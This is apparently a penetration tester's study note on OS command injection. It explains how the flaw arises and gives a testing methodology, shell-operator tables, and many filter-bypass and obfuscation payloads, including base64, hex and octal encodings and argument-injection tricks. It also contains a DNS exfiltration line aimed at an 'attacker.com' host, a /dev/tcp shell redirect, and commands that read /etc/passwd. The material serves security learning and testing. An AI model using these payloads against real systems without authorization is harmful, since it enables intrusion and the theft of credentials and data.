---
created: 2026-05-04
tags:
  - web_hacking
  - injection
---
## OS command injection

>**OS command injection** (also called **shell injection**) is a security vulnerability that allows an attacker to execute arbitrary operating system commands on the server hosting the application. 

- OS command injection occurs when user input is passed to a system shell or command interpreter without proper validation or sanitization.
- User-controlled input is directly passed to functions like  `shell_exec()`, `system()`, `exec()`, `popen()` in PHP; `os.system()`, `subprocess.run(shell=True)` in Python; `Runtime.exec()` in Java — without sanitizing meta-characters that the shell treats as command syntax, such as semicolons `;`, ampersands `&` / `&&`, or pipes  `|` / `||`. 
- The injected commands execute with the **same privileges as the web server process** (e.g., `www-data` on Linux).

| Web server / OS | Default process user                | Group                |
| --------------- | ----------------------------------- | -------------------- |
| Apache (Linux)  | `www-data`, `apache`, or `httpd`    | `www-data`, `apache` |
| Nginx (Linux)   | `nginx` or `www-data`               | `nginx`, `www-data`  |
| IIS (Windows)   | `IUSR` or `IIS APPPOOL\AppPoolName` | `IIS_IUSRS`          |

> [!important] OS command injection is one of the most impactful web vulnerabilities because it gives you **direct OS access**. From a single injection point, you can pivot to RCE, data exfiltration, lateral movement, and persistence.

- Potential impact includes:
	- **Remote Code Execution (RCE)**
	- **Sensitive data disclosure** (credentials, source code, environment variables)
	- **Privilege escalation**
	- **Lateral movement** to internal network resources
	- **Persistence** (cron jobs, SSH keys, web shells, backdoors)

## Command injection in source code

- When a shell like `/bin/bash` or `/bin/sh` receives a string, it tokenizes it according to shell grammar before executing.
- The grammar includes **meta-characters** — characters with special meaning to the shell that delimit, separate, or modify command execution.
- When user input containing these characters is concatenated into a command string and handed to a shell, the shell has no way to distinguish between intended and attacker-injection syntax.

---

- Consider the following PHP code:

```php
<?php
if (isset($_GET['hostname'])) {
    $output = shell_exec("nslookup " . $_GET['hostname']);
    echo "<pre>$output</pre>";
}
?>
```

- The developer intends `nslookup <hostname>`. 
- When the user supplies `example.com`, the shell receives:

```bash
nslookup example.com
```

- But when the user supplies `example.com; id`, the shell receives:

```bash
nslookup example.com; id
```

- The semicolon `;` is a **command separator** — a meta-character that tells the shell to execute the next token as a new, independent command.
- The shell therefore executes both `nslookup example.com` and `id`. This isn't vulnerability on its own — but lack of input validation and sanitization before the string reaches the shell is.
- The answer from the server may look like this:

```bash
Server:         192.168.1.1  
Address:        192.168.1.1#53  
  
Non-authoritative answer:  
Name:   example.com  
Address: 23.220.75.245    
# <SNIP>

uid=1000(trigger) gid=1000(trigger) groups=1000(trigger),998(wheel)
```
## OS command injection testing methodology

### 1. Identify potential input vectors

- **URL parameters**:

```bash
cmd
exec
command
execute
ping
query
jump
code
reg
do
func
arg
option
load
process
step
read
function
req
feature
exe
module
payload
run
print
```

- **HTTP headers** (may be used in logging, analytics, or server-side operations):
	- `User-Agent`
	- `Referer`
	- `X-Forwarded-For`
	- `X-Real-IP`
	- `Cookie`
	- `Host`
	- `Accept-Language`
	- Custom or non-standard headers

>[!tip] Pay special attention to functionality that might involve running system commands or interact with the web server OS. 

- Other vectors:
	- **File upload** — filenames may be passed to system commands (e.g., `convert`, `ffmpeg`, `zip`).
	- **File path parameters** (especially when the application interacts with the filesystem).
	- **API parameters** (REST, GraphQL, SOAP body fields).
	- **WebSocket message payloads**
	- **Hidden form fields**


- **High-risk functionality**
	- **Network diagnostic tools** — any feature running `ping`, `traceroute`, `nslookup`, `whois`, `dig`, `host`, etc.
	- **File operations** — upload, download, archive (`.zip`, `.tar`), format conversion.
	- **Media processing** — image resizing/conversion (`ImageMagick`, `ffmpeg`), video transcoding.
	- **Document processing** — PDF generation (`wkhtmltopdf`, `headless Chrome`), Office document conversion (`LibreOffice`).
	- **Backup and restore** — any feature that archives directories or databases.
	- **System monitoring and reporting** — log viewers, resource monitors, health dashboards.
	- **User account management** — features that invoke `useradd`, `passwd`, `chown`.
	- **Admin shell emulators** — terminal widgets in admin panels.

### 2. Establish a baseline

- Record normal application behavior for the parameter you're testing:

	1. Send a legitimate request and document the response: status code, response time, body content, headers.
	2. Send a clearly invalid value (e.g., a random string) and document the response; observe if any errors occur.
	3. Note whether output is reflected in the response body, headers, or is completely absent (blind).
	4. Record baseline **response time** — for time-based blind detection.

### 3. Probe for shell meta-characters

- Individually submit shell meta-characters and observe how the application responds. The to determine which ones are blocked and which are allowed.

```
' " ` ; & | && || $ ( ) { } [ ] < > \n \r %0a %0d
```

- In responses, look for:
	- **Error messages** containing shell syntax errors (e.g., `sh: syntax error`) confirm shell processing.
	- **Application errors or exceptions** may indicate the character disrupted a command string.
	- **No change** from baseline may indicate sanitization, or the character is harmless in the current context.
	- **Response time changes** on characters like `&` (background execution) may be observable.

- A useful fuzz list (run the command and copy the list):

```bash
echo -n "'"; echo -n ' " ! # % & ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~ $ %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %60 %7B %7C %7D ' | tr ' ' '\n' 
```

- See also:
	- [`SecLists/Fuzzing/special-chars + urlencoded.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars%20%2B%20urlencoded.txt)
	- [`SecLists/Fuzzing/special-chars.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt)

### 4. Attempt code execution

- Simple verification commands:

| Command purpose            | Linux               | Windows                                      |
| -------------------------- | ------------------- | -------------------------------------------- |
| Current user               | `whoami`            | `whoami`                                     |
| OS information             | `uname -a`          | `ver`                                        |
| Network configuration      | `ifconfig` / `ip a` | `ipconfig /all`                              |
| Active network connections | `netstat -an`       | `netstat -an`                                |
| Running processes          | `ps -ef`            | `tasklist`                                   |
| Current directory          | `pwd`               | `cd`                                         |
| File read                  | `cat /etc/passwd`   | `type C:\Windows\System32\drivers\etc\hosts` |

- Operators that can be used for chaining commands together:

| Operator           | Characters  | URL-encoded | Description                                                                                 |
| ------------------ | :---------: | :---------: | ------------------------------------------------------------------------------------------- |
| Semicolon          |     `;`     |    `%3B`    | Execute command 2 unconditionally after command 1.                                          |
| Newline            |    `\n`     |    `%0a`    | Execute command 2 unconditionally after command 1 (equivalent to semicolon in most shells). |
| `AND`              |    `&&`     |  `%26%26`   | Execute command 2 **only if** command 1 exits with code `0` (success)                       |
| `OR`               |   `\|\|`    |  `%7C%7C`   | Execute command 2 **only if** command 1 exits non-zero (failure).                           |
| Pipe               |    `\|`     |    `%7C`    | Pipe `stdout` of command 1 to `stdin` of command 2.                                         |
| Backtricks         | `` `cmd` `` |  `%60%60`   | Command substitution — execute `cmd` in a subshell, substitute output.                      |
| Parentheses        |  `$(cmd)`   | `%24%28%29` | Command substitution — modern POSIX standard, preferred over backticks.                     |
| Background         |     `&`     |    `%26`    | Run command 1 in background, immediately execute command 2.                                 |
| Output redirection |     `>`     |    `%3E`    | Redirects command output (`stdout`).                                                        |
| Input redirection  |     `<`     |    `%3C`    | Redirects command input (`stdin`).                                                          |

```bash
command_1 ;  command_2    # always runs both
command_1 && command_2    # command_2 runs only if command_1 succeeded
command_1 || command_2    # command_2 runs only if command_1 failed
command_1 |  command_2    # output of command_1 becomes input to command_2
command_1 &  command_2    # run command_1 in the background, then immediately run command_2
```

> [!important] The semicolon `;` does **not** work in Windows CMD. In CMD, use `&`, `&&`, `||`, or `|`. In PowerShell and POSIX shells (`bash`, `sh`, `zsh`), all operators above apply.

- Combine manual investigation with **fuzzing**:
	- [`PayloadsAllTheThings/Command Injection/Intruder/command_exec.txt`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt)
	- [`PayloadsAllTheThings/Command Injection/Intruder/command-execution-unix.txt`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt)
	- [`payloadbox/command-injection-payload-list`](https://github.com/payloadbox/command-injection-payload-list)
	- [`carlospolop/Auto_Wordlists`](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt) 

- Determine how output is returned to you. The exploitation path will be different:
	- **In-band (reflected)** — Command output appears directly in the HTTP response body or readers; the most straightforward.
	- **Blind** — No output reflected; the application executes the command, but you can't see the results. Two sub-types:
		- **Time-based blind**: Use timing commands to infer execution.
		- **Out-of-band (OOB)**: Exfiltrate data via DNS or HTTP to an external server you control.
	- **Error-based:** Some output leaks through error messages, even if the main channel doesn't reflect it.

- Timing commands:

```bash
# Linux — 10-second delay
sleep 10
ping -c 10 127.0.0.1

# Windows — 10-second delay
timeout 10
ping -n 10 127.0.0.1
```

- OOB (Out-Of-Band) commands:

```bash
# DNS lookup
nslookup example.com
host example.com
dig example.com
nslookup `whoami`.attacker.com # exfiltrating data through DNS queries

# HTTP requests
curl https://example.com
wget https://example.com
```

>[!important]+ OOB listeners
> - **[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)** (Burp Suite Professional)
> 	- Built into Burp Suite (Professional); generates a unique domain (`<subdomain.burpcollaborator.net>`) and monitors for DNS, HTTP, and other interactions.
> - **[`interactsh`](https://app.interactsh.com/#/)** 
> 	- Free open-source OOB server; designed for testing bugs that cause external interacts, such as SSRF, blind SQLi, blind command injection, etc.
> - **[`webhook.site`](https://webhook.site)**
> 	- A tool for building webhooks; generates a free, unique, random URL and e-mail address — everything that's sent to these addresses is displayed in the logs. 
> - **[`DNSlog.cn`](http://www.dnslog.cn/) and [`DNSLOG`](https://dnslog.org/)**
> 	- Public DNS logging services.

## Filter bypass 

- Filters are commonly implemented as blacklists — they reject inputs containing specific characters or commands strings. 
- Blacklist filters are inherently incomplete. The techniques below exploit gaps, alternative syntax, and shell expansion features to reconstruct blocked commands and characters.  

### Command alternatives

If a specific command is blocked, look for alternatives that give equivalent result:

- Reading files:

```bash
cat  /etc/passwd
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
sort /etc/passwd
tac  /etc/passwd        # cat in reverse
nl   /etc/passwd        # number lines
od -c /etc/passwd       # octal dump — character-by-character output
```

- Use shell redirection to read:

```bash
while read line; do echo $line; done < /etc/passwd
```

- Redirect file to a command:

```bash
< /etc/passwd
```

>[!note]+ Redirection with no command
>- In shells like Bash, a bare redirection like `< /etc/passwd` is still a **valid command**. When no command is provided explicitly, the shell runs a **no-op (null operation) command** (like `:`), and applies the redirection to it. 
>- Interactive shells often optimize this behavior: they open the file on `stdin` and then **echo it to `stdout`**, so it looks like the file is being printed.
>
>>[!important] This is shell-dependent.

### Bypassing space filters

The space character (`\x20`) is commonly filtered. You replace it, you can use:
 
- **`$IFS` — Internal Field Separator**
	- The **`$IFS` variable** is a special Bash environment variable (Internal Field Separator) that defines the characters Bash uses to split words during parsing. It defaults to a space, tab, and newline.
	- Because `$IFS` **contains** whitespace, it is interpreted as whitespace by the shell parser, making it a direct substitute for a literal space in command syntax:

```bash
cat${IFS}/etc/passwd
ls${IFS}-la${IFS}/home/
```

> [!tip]+
> - Print `$IFS` and see what's inside:
> ```bash
> printf '%s' "$IFS" | od -c
> ```
> 
> ```
> 0000000      \t  \n  \0
> 0000004
> ```

>[!note] See [`Internal Variables — Advanced Bash-Scripting Guide`](https://tldp.org/LDP/abs/html/internalvariables.html).

- **Brace expansion**
	- **Brace expansion** is a syntactic mechanism in Bash used to generate arbitrary strings that share a common prefix and suffix. 
	- For example, `echo {a,b}c` expands to `ac bc`.
	- You can set no prefix/suffix, too. A command and its arguments inside braces separated by comma are expanded to a space-separated command which is then executed. 

```bash
{cat,/etc/passwd}
{ls,-la,/home}
{id}                    # single command, also works
```

>[!warning] Whether execution via brace expansion will work depends on the shell
>- Bash that performs brace expansion first, expands `{cat,/etc/passwd}` to `cat /etc/passwd` and executes it. 
>- Zsh, for example, **does support** brace expansion, too, but it **expects it to be part of another command**. So, `echo {cat,/etc/passwd}` expands to `echo cat /etc/passwd`, but `{cat,/etc/passwd}` alone doesn't trigger execution.
>- POSIX `sh` (like Dash) **does not support brace expansion at all**. But in some cases, `/bin/sh` is actually linked to Bash.

>[!note] See [`Brace Expansion — Bash Reference Manual, gnu.org`](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html).
 
- **Bash input redirection**
	- You can often use redirect operators — `<` for `stdin` and `>` for `stdout` — as command separators.

```bash
cat</etc/passwd
sh</dev/tcp/127.0.0.1/1337
```

- **ANSI-C quoting**
	- **ANSI-C quoting** (`$'...'`) is a Bash quoting mechanism that **interprets ANSI C escape sequences** within a single-quoted string, including hex (`\xNN`), octal (`\NNN`), and other escape codes.
	- This allows you to encode any blocked character — space (`\x20`), tab (`\t`), newline (`\n`), and any other:

```bash
cat$'\x20'/etc/passwd          # \x20 = space
cat$'\t'/etc/passwd            # \t = tab (also works as whitespace)
X=$'cat\x20/etc/passwd'&&$X    # store command in a variable, then execute
```

>[!note] See [`ANSI-C Quoting — Bash Reference Manial, gnu.org`](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html).

- **URL-encoded tab**:

```bash
ls%09-al%09/home
```

- **Windows — environment variable substring**:
	- In Windows CMD, `%VARIABLE:~start,length%` extracts a substring from an environment variable. You can borrow a space from known variables:

```powershell
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

>[!note]+ To view environment variables in PowerShell, run `Get-ChildItem Env`.

>[!note] A similar technique exists in Bash, but you won't see spaces in variable values that often.
### Bypassing slash `/` and other character filters

- **Environment variable substrings**
	- The Bash substring expansion `${variable:offset:length}` extracts a string of `length` characters from `variable` starting at character index `offset` (zero-indexed).
	- You can use this to extract characters from known environment variables to reconstruct blocked characters without typing them:

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

${PATH:0:1}    # /  (char at index 0, length 1)
${PATH:5:1}    # s  (char at index 5, length 1)
${HOME:0:1}    # /  on most systems

# reconstruct /bin/sh without typing slashes directly:
${HOME:0:1}bin${HOME:0:1}sh
```

> [!tip] To discover which characters are at which positions in your environment variables, run `env` / `printenv` on the target or a similar system and map indices manually. Though `${PATH:0:1}` for `/` is quite universally reliable.

- **Character shifting**
	- The `tr` command translates characters by mapping one set to another. 
	- You can specify a source range and a destination range offset by one position in the ASCII table, and "shift" any input character to produce the target one:

```bash
# the tr command maps source range '!-}' (ASCII 33–125) to '"-~' (ASCII 34–126)
# this is a one-position forward shift in the ASCII table.
# input the character ONE BEFORE the target in ASCII order.

echo $(tr '!-}' '"-~'<<< .)   # . is ASCII 46; shifts to / (ASCII 47)
echo $(tr '!-}' '"-~'<<< :)   # : is ASCII 58; shifts to ; (ASCII 59)
echo $(tr '!-}' '"-~'<<< [)   # [ is ASCII 91; shifts to \ (ASCII 92)
echo $(tr '!-}' '"-~'<<< {)   # { is ASCII 123; shifts to | (ASCII 124)
echo $(tr '!-}' '"-~'<<< %')  # % is ASCII 37; shifts to & (ASCII 38)
```

| Target character | Input to `tr` | Full command             |
| ---------------- | ------------- | ------------------------ |
| `/` (slash)      | `.`           | `$(tr '!-}' '"-~'<<<.)`  |
| `;` (semicolon)  | `:`           | `$(tr '!-}' '"-~'<<<:)`  |
| `\` (backslash)  | `[`           | `$(tr '!-}' '"-~'<<<[)`  |
| `\|` (pipe)      | `{`           | `$(tr '!-}' '"-~'<<<{)`  |
| `&` (ampersand)  | `%`           | `$(tr '!-}' '"-~'<<<%')` |
| `$` (dollar)     | `#`           | `$(tr '!-}' '"-~'<<<#)`  |

### Command obfuscation

When specific **command strings** (e.g., `whoami`, `cat`, `/etc/passwd`) are blacklisted, attempt breaking the string into forms the filter doesn't recognize while keeping the syntax valid:

- **String concatenation with quotes**:
	- Bash discards empty quotes between characters.

```bash
w'h'o'am'i           # whoami
w"h"o"am"i           # whoami
c''a''t /etc/passwd  # cat /etc/passwd
```

- **Backslash escaping**:
	- In Bash, a backslash before any character causes the shell to treat it as a literal character (escaping its special meaning). For regular letters, this has no effect on execution — the letter is still the letter:

```bash
\w\h\o\a\m\i        # whoami
\c\a\t /etc/passwd  # cat /etc/passwd
/\b\i\n/\s\h        # /bin/sh
```


- **Empty command substitution (inline)**:
	- An empty subshell `$()` or empty backtick pair produces empty output. Inserting one inside a command name yields a token the filter may not match, but the shell still resolves:

```bash
wh``oami
who$()ami
who$(i)ami     # if variable $i is unset, expands to empty
```

- **Uninitialized variables**:
	- Unset variables expand to empty strings:

```bash
w${AB}h${CD}o${EF}a${GH}m${IJ}i # all variables undefined -> whoami
```

- **`$@` expansion**:
	- `$@` expands to the list of positional parameters — empty if none are set. Inserting it anywhere in a command name produces an empty expansion:

```bash
who$@ami
i$@d
```

> [!note] On Windows CMD, `^` is the escape character and can be inserted between characters: `who^ami`. This is the CMD equivalent of the above techniques.

- **Wildcards**:
	- The shell expands `*` and `?` against the filesystem before execution. Wildcards can replace characters in a command path or filename:

```bash
/b??/cat /??c/p??s??
/b?n/c?t /etc/p?ssw?
/bin/[c]at /etc/passwd   # character set expansion
```

> [!note] Wildcard expansion requires that the matched path actually exists on the filesystem. These will fail if no files match.

- **Encoding**:
	- **Base64 encoding**:
	
	```bash
	echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
	# encodes: cat /etc/passwd
	```
	
	```bash
	export CMD="Y2F0IC9ldGMvcGFzc3dk"
	bash<<<$(base64 -d<<<$CMD)
	```
	
	```bash
	# generate a Base64 payload:
	echo -n "cat /etc/passwd" | base64
	# Y2F0IC9ldGMvcGFzc3dk
	```
	
	- **Hex via `xxd`**:
	
	```bash
	bash<<<$(xxd -r -p<<<636174202f6574632f706173737764)
	```
	
	```bash
	# generate a hex payload:
	echo -n "cat /etc/passwd" | xxd -p
	# 636174202f6574632f706173737764
	```
	
	```bash
	# hex via echo -e (for arguments, not full commands)
	cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
	# \x2f\x65\x74\x63 = /etc, \x2f\x70\x61\x73\x73\x77\x64 = /passwd
	```
	
	- **Octal with ANSI-C quoting**:
	
	```bash
	`$'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'`
	# \143=c \141=a \164=t \040=space \057=/ \145=e \164=t \143=c \057=/ ...
	```

- **Reverse + command substitution**:

```bash
$(rev<<<'imaohw')     # reverses string "imaohw" back to "whoami", then executes it
$(printf "whoami")    # printf outputs the string, which is then executed
```

- **Newline continuation**:
	- Bash treats a backslash immediately before a newline as a line continuation — the newline is discarded and the next line is part of the same command:

```bash
cat /et\
c/pa\
sswd
```

- **URL-encoded**:

```bash
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

- **Nested command substitution**:

```bash
cat$(echo -n " /etc")$(echo /passwd)
```

- **`$0` expansion**:
	- `$0` expands to the name of the current shell or script. 
	- In an interactive shell context, `echo whoami | $0` pipes the string `whoami` to a new shell instance which executes it:

```bash
echo whoami | $0
```

### Combined examples

These combine multiple bypass techniques (which you will most likely need to do, too):

```bash
# bypass space + slash + command separation
127.0.0.1%0a{ls,-la,${PATH:0:1}home${PATH:0:1}user}

# bypass space + slash + read file
127.0.0.1%0a{c''at,${PATH:0:1}home${PATH:0:1}user${PATH:0:1}flag.txt}

# reconstruct path using PATH variable substrings
${PATH:0:1}usr${PATH:0:1}share${PATH:0:1}

# Base64-encoded command via URL-encoded tab and redirection
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
# Decodes to: find /usr/share/ | grep root | grep mysql | tail -n 1
```

## Argument Injection

> **Argument injection** is a sub-class of command injection in which the attacker can't chain additional commands but can inject **additional arguments** into an existing command call, causing the target program to behave in unintended ways that achieve code execution or data exfiltration.

This occurs when user input is passed as an argument to a program but is not sufficiently isolated — for example, when the application uses `shell_exec("program " . $userInput)` and strips command separators, but does not prevent the user from supplying flags or options that the target program processes as its own arguments.

Many command-line tools have flags designed for operational flexibility that can be abused in injection contexts:

- **SSH via `ProxyCommand`**:
	- The `-o` flag passes SSH configuration options inline. `ProxyCommand` specifies a command to connect through a proxy — it executes a shell command:

```bash
ssh '-oProxyCommand=id>/tmp/pwned' user@host
# SSH executes "id" and redirects output to /tmp/pwned
```

- **`tar` checkpoint actions**:
	- `tar` supports `--checkpoint` (trigger an action every N records) and `--checkpoint-action` (specify what action to take):

```bash
tar '--checkpoint=1' '--checkpoint-action=exec=id'
# tar executes "id" at each checkpoint
```

- **`env` split-string**:
	- The `--split-string` flag of GNU `env` allows splitting a string into command-line tokens, effectively allowing arbitrary command execution:

```bash
env '--split-string=sh -c "id"' placeholder
```

- **Other notable binary argument injections**:

```bash
# curl -- SSRF via injected URL
curl -o /tmp/out http://internal-service.local/secret

# find -- execute commands on matched files
find /tmp -name "*.txt" -exec id \;

# python/ruby/node -- inject --eval or similar flags
python3 --eval "import os; os.system('id')"
```

> [!note] See [`Argument Injection Vectors — sonarsource.github.io`](https://sonarsource.github.io/argument-injection-vectors/) —  a comprehensive reference for argument injection by binary; it's like GTFOBins but for argument injection specifically.
## Automated tools

### Bashfuscator

- [`Bashfuscator`](https://github.com/Bashfuscator/Bashfuscator) generates heavily obfuscated Bash payloads automatically. Useful when you know execution works but a WAF or application filter is matching your payloads.

>[!note]+ Installation
>```
>git clone https://github.com/Bashfuscator/Bashfuscator && \
>cd Bashfuscator && \
>pip3 install setuptools==65 && \
>python3 setup.py install --user
>```

- Usage:

```bash
bashfuscator -h
```

```
# ...
  -l, --list            List all the availible obfuscators,
                        compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
  -f FILE, --file FILE  Name of the script to obfuscate
  --stdin               Obfuscate stdin
  -o OUTFILE, --outfile OUTFILE
                        File to write payload to
# ...
```

- Obfuscate a command:

```bash
bashfuscator -c 'id'
# Output: ${*//IO|\y\\/\!\)pF_<} ${!#} ${*~~} ...
# (134,000 characters of noise that executes `id`)
```

- Obfuscate a script file:

```bash
bashfuscator -f myscript.sh -o output_payload.sh
```

- List available obfuscation methods:

```bash
bashfuscator -l
```

The output is valid Bash that produces the same result as the original command, but is unrecognizable to pattern-matching filters. Use it when simple obfuscation fails and you need something more extreme.

> [!note] Bashfuscator payloads can be very large (tens of thousands of characters). Some applications and WAFs have maximum parameter length limits that will reject over-sized payloads. Use the `-s` size flag to limit output when needed.

## References and further reading

- [`Command Injection — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [`Command Injection — HackTricks`](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
- [`Testing for Command Injection — OWASP WSTG`](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)

- [`Command injection attack guide — hackviser`](https://hackviser.com/tactics/pentesting/web/command-injection)


- [`Argument injection and getting past shellwords.escape — Staaldraad`](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [`Argument Injection Explained — sonarsource.github.io`](https://sonarsource.github.io/argument-injection-vectors/explained/)

-  [`Argument Injection Vectors — sonarsource.github.io`](https://sonarsource.github.io/argument-injection-vectors/)

- [`Internal Variables — Advanced Bash-Scripting Guide`](https://tldp.org/LDP/abs/html/internalvariables.html)
- [`Brace Expansion — Bash Reference Manual`](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
- [`Brace Expansion in Linux — Cloudaffle`](https://cloudaffle.com/series/how-shell-receives-inputs/brace-expansion/)
- [`ANSI-C Quoting — Bash Reference Manual`](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html)


- [`Internal Variables — Advanced Bash-Scripting Guide`](https://tldp.org/LDP/abs/html/internalvariables.html)
- [`Brace Expansion — Bash Reference Manual, gnu.org`](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
- [`ANSI-C Quoting — Bash Reference Manial, gnu.org`](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html)
